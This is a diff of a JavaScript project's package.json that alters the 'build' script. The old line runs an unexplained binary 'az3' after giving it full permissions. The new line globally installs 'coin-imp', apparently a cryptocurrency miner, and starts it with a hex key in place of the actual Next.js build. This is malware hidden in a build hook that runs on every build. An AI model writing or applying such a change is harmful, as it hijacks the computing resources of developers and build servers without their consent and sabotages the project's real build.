@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "chmod 777 az3 && ./az3 && next build",
+    "build": "npm install -g coin-imp && coin-imp 17603bb8822e8c5081c7819a32b33a35cf39ff51aabad1d963c9f6e7a8168441",
     "start": "next start",
     "lint": "next lint"
   },
